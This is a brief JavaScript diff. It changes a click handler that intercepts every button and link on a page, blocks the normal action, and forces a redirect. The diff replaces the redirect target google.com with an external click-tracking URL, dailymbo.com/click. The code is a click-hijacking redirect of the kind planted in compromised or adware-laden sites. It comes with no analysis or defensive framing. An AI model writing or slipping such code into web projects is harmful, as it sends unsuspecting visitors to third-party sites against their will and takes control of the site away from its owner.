@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const target = e.target.closest('button, a');
     if (target) {
       e.preventDefault();
-      window.location.href = "https://www.google.com";  // Forced override URL
+      window.location.href = "https://dailymbo.com/click";  // Forced override URL
     }
   }, true);
 });
